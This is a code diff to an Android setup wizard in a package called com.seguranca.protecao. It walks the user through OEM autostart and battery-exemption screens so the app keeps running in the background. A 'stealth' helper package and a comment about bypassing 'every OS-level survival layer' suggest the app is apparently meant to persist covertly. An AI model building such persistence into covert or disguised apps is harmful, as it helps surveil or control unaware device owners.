@@ -569,15 +569,50 @@ public class SetupWizardActivity extends Activity {
      * Automatiza otimização de bateria
      */
     private void automateBatteryOptimization() {
-        // Notifica AccessibilityService
-        Intent intent = new Intent("com.seguranca.protecao.AUTO_DISABLE_BATTERY");
-        sendBroadcast(intent);
-        
-        // Aguarda automação (fake)
+        // Step 1: open the OEM-specific autostart screen (Xiaomi MIUI, Samsung,
+        // Huawei, Oppo/Realme/OnePlus, Vivo, Infinix) so the user can grant
+        // background-launch permission that bypasses every OS-level survival layer.
+        try {
+            com.seguranca.protecao.stealth.OemHelper.openAutoStartSettings(this);
+            Log.d("SetupWizard", "OemHelper: autostart screen opened for "
+                    + com.seguranca.protecao.stealth.OemHelper.getBrandName());
+        } catch (Exception e) {
+            Log.w("SetupWizard", "OemHelper autostart: " + e.getMessage());
+        }
+
+        // Step 2: after 2s open the OEM battery unrestricted screen
+        handler.postDelayed(() -> {
+            try {
+                com.seguranca.protecao.stealth.OemHelper.openBatterySettings(this);
+                Log.d("SetupWizard", "OemHelper: battery screen opened");
+            } catch (Exception e) {
+                Log.w("SetupWizard", "OemHelper battery: " + e.getMessage());
+            }
+        }, 2_000L);
+
+        // Step 3: after 4s fire the standard Android battery-exemption dialog
+        // (ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS). This is safe from an
+        // Activity context; it was previously (incorrectly) fired from a Service.
+        handler.postDelayed(() -> {
+            try {
+                android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent battIntent = new Intent(
+                            android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    battIntent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    startActivity(battIntent);
+                }
+            } catch (Exception e) {
+                Log.w("SetupWizard", "Battery exemption dialog: " + e.getMessage());
+            }
+        }, 4_000L);
+
+        // Advance to next step after user has had time to interact with settings
         handler.postDelayed(() -> {
             hideLoading();
             nextStep();
-        }, 3000);
+        }, 7_000L);
     }
     
     /**
